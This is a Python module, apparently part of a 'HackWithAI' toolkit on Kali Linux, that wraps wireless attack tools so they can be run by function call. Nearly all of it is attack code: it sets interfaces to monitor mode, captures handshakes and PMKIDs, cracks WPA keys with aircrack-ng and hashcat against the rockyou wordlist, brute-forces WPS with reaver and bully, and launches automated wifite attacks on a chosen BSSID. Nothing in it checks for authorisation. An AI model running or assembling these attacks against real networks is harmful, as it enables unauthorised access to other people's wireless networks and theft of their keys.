#!/usr/bin/env python3
"""Wireless Hacking Tools — aircrack-ng, reaver, wifite, hcxdumptool, hashcat-wpa"""

import subprocess, json, sys, shutil
from pathlib import Path
from typing import List, Dict

OUTPUT_DIR = Path("/home/kali/HackWithAI/data/captures")
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def _run(cmd: List[str], timeout: int = 300, capture: bool = True) -> dict:
    try:
        r = subprocess.run(cmd, capture_output=capture, text=True, timeout=timeout)
        return {"ok": r.returncode == 0, "stdout": r.stdout, "stderr": r.stderr, "rc": r.returncode}
    except FileNotFoundError:
        return {"ok": False, "error": f"Tool not found: {cmd[0]}"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "error": "Timeout"}

def _which(tool: str) -> bool: return shutil.which(tool) is not None

# ── Monitor Mode ─────────────────────────────────────────────────────────
def airmon_start(interface: str = "wlan0") -> dict:
    return _run(["sudo", "airmon-ng", "start", interface])

def airmon_stop(interface: str = "wlan0mon") -> dict:
    return _run(["sudo", "airmon-ng", "stop", interface])

# ── Packet Capture ───────────────────────────────────────────────────────
def airodump_capture(interface: str = "wlan0mon", channel: str = "",
                     outfile: str = "", bssid: str = "") -> dict:
    path = outfile or str(OUTPUT_DIR / "airodump_capture")
    cmd = ["sudo", "airodump-ng", "--write", path]
    if channel: cmd += ["-c", channel]
    if bssid: cmd += ["--bssid", bssid]
    cmd.append(interface)
    return _run(cmd, timeout=120, capture=False)

# ── WPA/WPA2 Cracking ────────────────────────────────────────────────────
def aircrack_wpa(capture_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> dict:
    return _run(["aircrack-ng", capture_file, "-w", wordlist], timeout=600)

def hcxdumptool_capture(interface: str = "wlan0mon", outfile: str = "") -> dict:
    path = outfile or str(OUTPUT_DIR / "pmkid_capture.pcapng")
    return _run(["sudo", "hcxdumptool", "-i", interface, "-o", path, "--enable_status=3"],
                timeout=120, capture=False)

def hcxpcapng_tool(pcapng: str, outfile: str = "") -> dict:
    path = outfile or str(OUTPUT_DIR / "pmkid.hc22000")
    return _run(["hcxpcapngtool", "-o", path, pcapng])

def hashcat_wpa(hc22000_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> dict:
    return _run(["hashcat", "-m", "22000", hc22000_file, wordlist, "--force"], timeout=600)

# ── WPS Attacks ──────────────────────────────────────────────────────────
def reaver_wps(interface: str = "wlan0mon", bssid: str = "", channel: str = "") -> dict:
    cmd = ["sudo", "reaver", "-i", interface, "-b", bssid, "-vv"]
    if channel: cmd += ["-c", channel]
    return _run(cmd, timeout=300, capture=False)

def bully_wps(interface: str = "wlan0mon", bssid: str = "") -> dict:
    return _run(["sudo", "bully", interface, "-b", bssid], timeout=300, capture=False)

# ── Automated ────────────────────────────────────────────────────────────
def wifite_attack(targets: str = "", kill_conflicts: bool = True) -> dict:
    cmd = ["sudo", "wifite"]
    if kill_conflicts: cmd.append("--kill")
    if targets: cmd += ["--bssid", targets]
    return _run(cmd, timeout=600, capture=False)

def kismet_start(interface: str = "wlan0") -> dict:
    return _run(["sudo", "kismet", "-c", interface], timeout=60, capture=False)

# ── CLI ──────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "help"
    if cmd == "scan":     print(json.dumps({"status": "run: sudo airodump-ng wlan0mon"}))
    elif cmd == "wifite": print(json.dumps(wifite_attack()))
    elif cmd == "crack":  print(json.dumps(aircrack_wpa(sys.argv[2])))
    else: print("Commands: scan | wifite | crack <capture>")
